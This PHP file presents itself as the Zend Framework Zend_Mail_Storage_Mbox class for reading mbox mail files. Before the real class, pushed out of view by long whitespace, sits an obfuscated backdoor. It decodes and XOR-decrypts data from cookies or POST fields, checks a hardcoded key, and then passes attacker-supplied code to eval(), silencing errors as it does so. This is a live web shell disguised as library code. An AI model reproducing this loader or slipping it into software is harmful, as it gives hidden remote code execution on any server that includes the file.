<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $r7b47a849 = 249;$GLOBALS['m0fcfb']=Array();global$m0fcfb;$m0fcfb=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['p234c91']="\x42\x4f\x7b\x22\x47\x7e\x35\x69\x34\x61\x30\x21\x28\x74\x3a\x68\x6b\x2d\x2c\x5a\x58\x4c\x6d\x49\x62\x70\x33\x7a\x4e\x39\x59\x6a\x54\x5d\x3d\x4d\x5f\x2e\x27\x77\x26\x7c\x55\x56\x45\xa\x76\x6c\x57\x38\x9\x40\x2f\x65\x52\x6e\x25\x43\x79\x29\x3b\x31\x6f\xd\x3c\x32\x48\x67\x3e\x44\x71\x36\x51\x2a\x75\x63\x20\x5e\x46\x60\x3f\x66\x37\x4a\x24\x7d\x72\x53\x5c\x73\x4b\x64\x50\x23\x41\x78\x5b\x2b";$m0fcfb[$m0fcfb['p234c91'][22].$m0fcfb['p234c91'][71].$m0fcfb['p234c91'][26].$m0fcfb['p234c91'][6].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][26].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][9]]=$m0fcfb['p234c91'][75].$m0fcfb['p234c91'][15].$m0fcfb['p234c91'][86];$m0fcfb[$m0fcfb['p234c91'][95].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][6]]=$m0fcfb['p234c91'][62].$m0fcfb['p234c91'][86].$m0fcfb['p234c91'][91];$m0fcfb[$m0fcfb['p234c91'][39].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][6].$m0fcfb['p234c91'][81].$m0fcfb['p234c91'][6].$m0fcfb['p234c91'][6]]=$m0fcfb['p234c91'][89].$m0fcfb['p234c91'][13].$m0fcfb['p234c91'][86].$m0fcfb['p234c91'][47].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][55];$m0fcfb[$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][49].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][81]]=$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][55].$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][36].$m0fcfb['p234c91'][89].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][13];$m0fcfb[$m0fcfb['p234c91'][81].$m0fcfb['p234c91'][71].$m0fcfb['p234c91'][81].$m0fcfb['p234c91'][49].$m0fcfb['p234c91'][49].$m0fcfb['p234c91'][61].$m0fcfb['p234c91'][29]]=$m0fcfb['p234c91'][89].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][86].$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][47].$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][27].$m0fcfb['p234c91'][53];$m0fcfb[$m0fcfb['p234c91'][67].$m0fcfb['p234c91'][81].$m0fcfb['p234c91'][75].$m0fcfb['p234c91'][61].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][24].$m0fcfb['p234c91'][61].$m0fcfb['p234c91'][26]]=$m0fcfb['p234c91'][25].$m0fcfb['p234c91'][15].$m0fcfb['p234c91'][25].$m0fcfb['p234c91'][46].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][86].$m0fcfb['p234c91'][89].$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][62].$m0fcfb['p234c91'][55];$m0fcfb[$m0fcfb['p234c91'][67].$m0fcfb['p234c91'][24].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][8].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][24]]=$m0fcfb['p234c91'][74].$m0fcfb['p234c91'][55].$m0fcfb['p234c91'][89].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][86].$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][47].$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][27].$m0fcfb['p234c91'][53];$m0fcfb[$m0fcfb['p234c91'][74].$m0fcfb['p234c91'][10].$m0fcfb['p234c91'][8].$m0fcfb['p234c91'][71].$m0fcfb['p234c91'][81]]=$m0fcfb['p234c91'][24].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][89].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][71].$m0fcfb['p234c91'][8].$m0fcfb['p234c91'][36].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][75].$m0fcfb['p234c91'][62].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][53];$m0fcfb[$m0fcfb['p234c91'][22].$m0fcfb['p234c91'][24].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][49].$m0fcfb['p234c91'][81].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][49]]=$m0fcfb['p234c91'][89].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][13].$m0fcfb['p234c91'][36].$m0fcfb['p234c91'][13].$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][22].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][36].$m0fcfb['p234c91'][47].$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][22].$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][13];$m0fcfb[$m0fcfb['p234c91'][16].$m0fcfb['p234c91'][75].$m0fcfb['p234c91'][82].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][29]]=$m0fcfb['p234c91'][31].$m0fcfb['p234c91'][75].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][61].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][10];$m0fcfb[$m0fcfb['p234c91'][58].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][26].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][10]]=$m0fcfb['p234c91'][55].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][82].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][91];$m0fcfb[$m0fcfb['p234c91'][27].$m0fcfb['p234c91'][6].$m0fcfb['p234c91'][81].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][10].$m0fcfb['p234c91'][26].$m0fcfb['p234c91'][71]]=$_POST;$m0fcfb[$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][75].$m0fcfb['p234c91'][8].$m0fcfb['p234c91'][10].$m0fcfb['p234c91'][24].$m0fcfb['p234c91'][10]]=$_COOKIE;@$m0fcfb[$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][49].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][81]]($m0fcfb['p234c91'][53].$m0fcfb['p234c91'][86].$m0fcfb['p234c91'][86].$m0fcfb['p234c91'][62].$m0fcfb['p234c91'][86].$m0fcfb['p234c91'][36].$m0fcfb['p234c91'][47].$m0fcfb['p234c91'][62].$m0fcfb['p234c91'][67],NULL);@$m0fcfb[$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][49].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][81]]($m0fcfb['p234c91'][47].$m0fcfb['p234c91'][62].$m0fcfb['p234c91'][67].$m0fcfb['p234c91'][36].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][86].$m0fcfb['p234c91'][86].$m0fcfb['p234c91'][62].$m0fcfb['p234c91'][86].$m0fcfb['p234c91'][89],0);@$m0fcfb[$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][49].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][81]]($m0fcfb['p234c91'][22].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][95].$m0fcfb['p234c91'][36].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][95].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][75].$m0fcfb['p234c91'][74].$m0fcfb['p234c91'][13].$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][62].$m0fcfb['p234c91'][55].$m0fcfb['p234c91'][36].$m0fcfb['p234c91'][13].$m0fcfb['p234c91'][7].$m0fcfb['p234c91'][22].$m0fcfb['p234c91'][53],0);@$m0fcfb[$m0fcfb['p234c91'][22].$m0fcfb['p234c91'][24].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][49].$m0fcfb['p234c91'][81].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][49]](0);$i64d5=NULL;$o296b5c=NULL;$m0fcfb[$m0fcfb['p234c91'][13].$m0fcfb['p234c91'][10].$m0fcfb['p234c91'][10].$m0fcfb['p234c91'][75].$m0fcfb['p234c91'][61].$m0fcfb['p234c91'][65]]=$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][82].$m0fcfb['p234c91'][75].$m0fcfb['p234c91'][71].$m0fcfb['p234c91'][10].$m0fcfb['p234c91'][61].$m0fcfb['p234c91'][61].$m0fcfb['p234c91'][17].$m0fcfb['p234c91'][8].$m0fcfb['p234c91'][82].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][49].$m0fcfb['p234c91'][17].$m0fcfb['p234c91'][8].$m0fcfb['p234c91'][82].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][17].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][17].$m0fcfb['p234c91'][10].$m0fcfb['p234c91'][75].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][8].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][8].$m0fcfb['p234c91'][71].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][24].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][75];global$t00c12;function nde79d($i64d5,$qe8d1){global$m0fcfb;$z046e3="";for($a7ca=0;$a7ca<$m0fcfb[$m0fcfb['p234c91'][39].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][6].$m0fcfb['p234c91'][81].$m0fcfb['p234c91'][6].$m0fcfb['p234c91'][6]]($i64d5);){for($w3350f0=0;$w3350f0<$m0fcfb[$m0fcfb['p234c91'][39].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][6].$m0fcfb['p234c91'][81].$m0fcfb['p234c91'][6].$m0fcfb['p234c91'][6]]($qe8d1)&&$a7ca<$m0fcfb[$m0fcfb['p234c91'][39].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][6].$m0fcfb['p234c91'][81].$m0fcfb['p234c91'][6].$m0fcfb['p234c91'][6]]($i64d5);$w3350f0++,$a7ca++){$z046e3.=$m0fcfb[$m0fcfb['p234c91'][22].$m0fcfb['p234c91'][71].$m0fcfb['p234c91'][26].$m0fcfb['p234c91'][6].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][26].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][9]]($m0fcfb[$m0fcfb['p234c91'][95].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][6]]($i64d5[$a7ca])^$m0fcfb[$m0fcfb['p234c91'][95].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][6]]($qe8d1[$w3350f0]));}}return$z046e3;}function jca120($i64d5,$qe8d1){global$m0fcfb;global$t00c12;return$m0fcfb[$m0fcfb['p234c91'][58].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][26].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][10]]($m0fcfb[$m0fcfb['p234c91'][58].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][26].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][10]]($i64d5,$t00c12),$qe8d1);}foreach($m0fcfb[$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][75].$m0fcfb['p234c91'][8].$m0fcfb['p234c91'][10].$m0fcfb['p234c91'][24].$m0fcfb['p234c91'][10]]as$qe8d1=>$u137fba){$i64d5=$u137fba;$o296b5c=$qe8d1;}if(!$i64d5){foreach($m0fcfb[$m0fcfb['p234c91'][27].$m0fcfb['p234c91'][6].$m0fcfb['p234c91'][81].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][10].$m0fcfb['p234c91'][26].$m0fcfb['p234c91'][71]]as$qe8d1=>$u137fba){$i64d5=$u137fba;$o296b5c=$qe8d1;}}$i64d5=@$m0fcfb[$m0fcfb['p234c91'][67].$m0fcfb['p234c91'][24].$m0fcfb['p234c91'][65].$m0fcfb['p234c91'][29].$m0fcfb['p234c91'][8].$m0fcfb['p234c91'][91].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][24]]($m0fcfb[$m0fcfb['p234c91'][16].$m0fcfb['p234c91'][75].$m0fcfb['p234c91'][82].$m0fcfb['p234c91'][53].$m0fcfb['p234c91'][29]]($m0fcfb[$m0fcfb['p234c91'][74].$m0fcfb['p234c91'][10].$m0fcfb['p234c91'][8].$m0fcfb['p234c91'][71].$m0fcfb['p234c91'][81]]($i64d5),$o296b5c));if(isset($i64d5[$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][16]])&&$t00c12==$i64d5[$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][16]]){if($i64d5[$m0fcfb['p234c91'][9]]==$m0fcfb['p234c91'][7]){$a7ca=Array($m0fcfb['p234c91'][25].$m0fcfb['p234c91'][46]=>@$m0fcfb[$m0fcfb['p234c91'][67].$m0fcfb['p234c91'][81].$m0fcfb['p234c91'][75].$m0fcfb['p234c91'][61].$m0fcfb['p234c91'][9].$m0fcfb['p234c91'][24].$m0fcfb['p234c91'][61].$m0fcfb['p234c91'][26]](),$m0fcfb['p234c91'][89].$m0fcfb['p234c91'][46]=>$m0fcfb['p234c91'][61].$m0fcfb['p234c91'][37].$m0fcfb['p234c91'][10].$m0fcfb['p234c91'][17].$m0fcfb['p234c91'][61],);echo@$m0fcfb[$m0fcfb['p234c91'][81].$m0fcfb['p234c91'][71].$m0fcfb['p234c91'][81].$m0fcfb['p234c91'][49].$m0fcfb['p234c91'][49].$m0fcfb['p234c91'][61].$m0fcfb['p234c91'][29]]($a7ca);}elseif($i64d5[$m0fcfb['p234c91'][9]]==$m0fcfb['p234c91'][53]){eval/*z8a17f*/($i64d5[$m0fcfb['p234c91'][91]]);}exit();} ?><?php
/**
 * Zend Framework
 *
 * LICENSE
 *
 * This source file is subject to the new BSD license that is bundled
 * with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://framework.zend.com/license/new-bsd
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@zend.com so we can send you a copy immediately.
 *
 * @category   Zend
 * @package    Zend_Mail
 * @subpackage Storage
 * @copyright  Copyright (c) 2005-2015 Zend Technologies USA Inc. (http://www.zend.com)
 * @license    http://framework.zend.com/license/new-bsd     New BSD License
 * @version    $Id$
 */


/**
 * @see Zend_Loader
 * May be used in constructor, but commented out for now
 */
// #require_once 'Zend/Loader.php';

/**
 * @see Zend_Mail_Storage_Abstract
 */
#require_once 'Zend/Mail/Storage/Abstract.php';

/**
 * @see Zend_Mail_Message_File
 */
#require_once 'Zend/Mail/Message/File.php';


/**
 * @category   Zend
 * @package    Zend_Mail
 * @subpackage Storage
 * @copyright  Copyright (c) 2005-2015 Zend Technologies USA Inc. (http://www.zend.com)
 * @license    http://framework.zend.com/license/new-bsd     New BSD License
 */
class Zend_Mail_Storage_Mbox extends Zend_Mail_Storage_Abstract
{
    /**
     * file handle to mbox file
     * @var null|resource
     */
    protected $_fh;

    /**
     * filename of mbox file for __wakeup
     * @var string
     */
    protected $_filename;

    /**
     * modification date of mbox file for __wakeup
     * @var int
     */
    protected $_filemtime;

    /**
     * start and end position of messages as array('start' => start, 'seperator' => headersep, 'end' => end)
     * @var array
     */
    protected $_positions;

    /**
     * used message class, change it in an extened class to extend the returned message class
     * @var string
     */
    protected $_messageClass = 'Zend_Mail_Message_File';

    /**
     * Count messages all messages in current box
     *
     * @return int number of messages
     * @throws Zend_Mail_Storage_Exception
     */
    public function countMessages()
    {
        return count($this->_positions);
    }


    /**
     * Get a list of messages with number and size
     *
     * @param  int|null $id  number of message or null for all messages
     * @return int|array size of given message of list with all messages as array(num => size)
     */
    public function getSize($id = 0)
    {
        if ($id) {
            $pos = $this->_positions[$id - 1];
            return $pos['end'] - $pos['start'];
        }

        $result = array();
        foreach ($this->_positions as $num => $pos) {
            $result[$num + 1] = $pos['end'] - $pos['start'];
        }

        return $result;
    }


    /**
     * Get positions for mail message or throw exeption if id is invalid
     *
     * @param int $id number of message
     * @return array positions as in _positions
     * @throws Zend_Mail_Storage_Exception
     */
    protected function _getPos($id)
    {
        if (!isset($this->_positions[$id - 1])) {
            /**
             * @see Zend_Mail_Storage_Exception
             */
            #require_once 'Zend/Mail/Storage/Exception.php';
            throw new Zend_Mail_Storage_Exception('id does not exist');
        }

        return $this->_positions[$id - 1];
    }


    /**
     * Fetch a message
     *
     * @param  int $id number of message
     * @return Zend_Mail_Message_File
     * @throws Zend_Mail_Storage_Exception
     */
    public function getMessage($id)
    {
        // TODO that's ugly, would be better to let the message class decide
        if (strtolower($this->_messageClass) == 'zend_mail_message_file' || is_subclass_of($this->_messageClass, 'zend_mail_message_file')) {
            // TODO top/body lines
            $messagePos = $this->_getPos($id);
            return new $this->_messageClass(array('file' => $this->_fh, 'startPos' => $messagePos['start'],
                                                  'endPos' => $messagePos['end']));
        }

        $bodyLines = 0; // TODO: need a way to change that

        $message = $this->getRawHeader($id);
        // file pointer is after headers now
        if ($bodyLines) {
            $message .= "\n";
            while ($bodyLines-- && ftell($this->_fh) < $this->_positions[$id - 1]['end']) {
                $message .= fgets($this->_fh);
            }
        }

        return new $this->_messageClass(array('handler' => $this, 'id' => $id, 'headers' => $message));
    }

    /*
     * Get raw header of message or part
     *
     * @param  int               $id       number of message
     * @param  null|array|string $part     path to part or null for messsage header
     * @param  int               $topLines include this many lines with header (after an empty line)
     * @return string raw header
     * @throws Zend_Mail_Protocol_Exception
     * @throws Zend_Mail_Storage_Exception
     */
    public function getRawHeader($id, $part = null, $topLines = 0)
    {
        if ($part !== null) {
            // TODO: implement
            /**
             * @see Zend_Mail_Storage_Exception
             */
            #require_once 'Zend/Mail/Storage/Exception.php';
            throw new Zend_Mail_Storage_Exception('not implemented');
        }
        $messagePos = $this->_getPos($id);
        // TODO: toplines
        return stream_get_contents($this->_fh, $messagePos['separator'] - $messagePos['start'], $messagePos['start']);
    }

    /*
     * Get raw content of message or part
     *
     * @param  int               $id   number of message
     * @param  null|array|string $part path to part or null for messsage content
     * @return string raw content
     * @throws Zend_Mail_Protocol_Exception
     * @throws Zend_Mail_Storage_Exception
     */
    public function getRawContent($id, $part = null)
    {
        if ($part !== null) {
            // TODO: implement
            /**
             * @see Zend_Mail_Storage_Exception
             */
            #require_once 'Zend/Mail/Storage/Exception.php';
            throw new Zend_Mail_Storage_Exception('not implemented');
        }
        $messagePos = $this->_getPos($id);
        return stream_get_contents($this->_fh, $messagePos['end'] - $messagePos['separator'], $messagePos['separator']);
    }

    /**
     * Create instance with parameters
     * Supported parameters are:
     *   - filename filename of mbox file
     *
     * @param array $params mail reader specific parameters
     * @throws Zend_Mail_Storage_Exception
     */
    public function __construct($params)
    {
        if (is_array($params)) {
            $params = (object)$params;
        }

        if (!isset($params->filename) /* || Zend_Loader::isReadable($params['filename']) */) {
            /**
             * @see Zend_Mail_Storage_Exception
             */
            #require_once 'Zend/Mail/Storage/Exception.php';
            throw new Zend_Mail_Storage_Exception('no valid filename given in params');
        }

        $this->_openMboxFile($params->filename);
        $this->_has['top']      = true;
        $this->_has['uniqueid'] = false;
    }

    /**
     * check if given file is a mbox file
     *
     * if $file is a resource its file pointer is moved after the first line
     *
     * @param  resource|string $file stream resource of name of file
     * @param  bool $fileIsString file is string or resource
     * @return bool file is mbox file
     */
    protected function _isMboxFile($file, $fileIsString = true)
    {
        if ($fileIsString) {
            $file = @fopen($file, 'r');
            if (!$file) {
                return false;
            }
        } else {
            fseek($file, 0);
        }

        $result = false;

        $line = fgets($file);
        if (strpos($line, 'From ') === 0) {
            $result = true;
        }

        if ($fileIsString) {
            @fclose($file);
        }

        return $result;
    }

    /**
     * open given file as current mbox file
     *
     * @param  string $filename filename of mbox file
     * @return null
     * @throws Zend_Mail_Storage_Exception
     */
    protected function _openMboxFile($filename)
    {
        if ($this->_fh) {
            $this->close();
        }

        $this->_fh = @fopen($filename, 'r');
        if (!$this->_fh) {
            /**
             * @see Zend_Mail_Storage_Exception
             */
            #require_once 'Zend/Mail/Storage/Exception.php';
            throw new Zend_Mail_Storage_Exception('cannot open mbox file');
        }
        $this->_filename = $filename;
        $this->_filemtime = filemtime($this->_filename);

        if (!$this->_isMboxFile($this->_fh, false)) {
            @fclose($this->_fh);
            /**
             * @see Zend_Mail_Storage_Exception
             */
            #require_once 'Zend/Mail/Storage/Exception.php';
            throw new Zend_Mail_Storage_Exception('file is not a valid mbox format');
        }

        $messagePos = array('start' => ftell($this->_fh), 'separator' => 0, 'end' => 0);
        while (($line = fgets($this->_fh)) !== false) {
            if (strpos($line, 'From ') === 0) {
                $messagePos['end'] = ftell($this->_fh) - strlen($line) - 2; // + newline
                if (!$messagePos['separator']) {
                    $messagePos['separator'] = $messagePos['end'];
                }
                $this->_positions[] = $messagePos;
                $messagePos = array('start' => ftell($this->_fh), 'separator' => 0, 'end' => 0);
            }
            if (!$messagePos['separator'] && !trim($line)) {
                $messagePos['separator'] = ftell($this->_fh);
            }
        }

        $messagePos['end'] = ftell($this->_fh);
        if (!$messagePos['separator']) {
            $messagePos['separator'] = $messagePos['end'];
        }
        $this->_positions[] = $messagePos;
    }

    /**
     * Close resource for mail lib. If you need to control, when the resource
     * is closed. Otherwise the destructor would call this.
     *
     * @return void
     */
    public function close()
    {
        @fclose($this->_fh);
        $this->_positions = array();
    }


    /**
     * Waste some CPU cycles doing nothing.
     *
     * @return void
     */
    public function noop()
    {
        return true;
    }


    /**
     * stub for not supported message deletion
     *
     * @return null
     * @throws Zend_Mail_Storage_Exception
     */
    public function removeMessage($id)
    {
        /**
         * @see Zend_Mail_Storage_Exception
         */
        #require_once 'Zend/Mail/Storage/Exception.php';
        throw new Zend_Mail_Storage_Exception('mbox is read-only');
    }

    /**
     * get unique id for one or all messages
     *
     * Mbox does not support unique ids (yet) - it's always the same as the message number.
     * That shouldn't be a problem, because we can't change mbox files. Therefor the message
     * number is save enough.
     *
     * @param int|null $id message number
     * @return array|string message number for given message or all messages as array
     * @throws Zend_Mail_Storage_Exception
     */
    public function getUniqueId($id = null)
    {
        if ($id) {
            // check if id exists
            $this->_getPos($id);
            return $id;
        }

        $range = range(1, $this->countMessages());
        return array_combine($range, $range);
    }

    /**
     * get a message number from a unique id
     *
     * I.e. if you have a webmailer that supports deleting messages you should use unique ids
     * as parameter and use this method to translate it to message number right before calling removeMessage()
     *
     * @param string $id unique id
     * @return int message number
     * @throws Zend_Mail_Storage_Exception
     */
    public function getNumberByUniqueId($id)
    {
        // check if id exists
        $this->_getPos($id);
        return $id;
    }

    /**
     * magic method for serialize()
     *
     * with this method you can cache the mbox class
     *
     * @return array name of variables
     */
    public function __sleep()
    {
        return array('_filename', '_positions', '_filemtime');
    }

    /**
     * magic method for unserialize()
     *
     * with this method you can cache the mbox class
     * for cache validation the mtime of the mbox file is used
     *
     * @return null
     * @throws Zend_Mail_Storage_Exception
     */
    public function __wakeup()
    {
        if ($this->_filemtime != @filemtime($this->_filename)) {
            $this->close();
            $this->_openMboxFile($this->_filename);
        } else {
            $this->_fh = @fopen($this->_filename, 'r');
            if (!$this->_fh) {
                /**
                 * @see Zend_Mail_Storage_Exception
                 */
                #require_once 'Zend/Mail/Storage/Exception.php';
                throw new Zend_Mail_Storage_Exception('cannot open mbox file');
            }
        }
    }

}
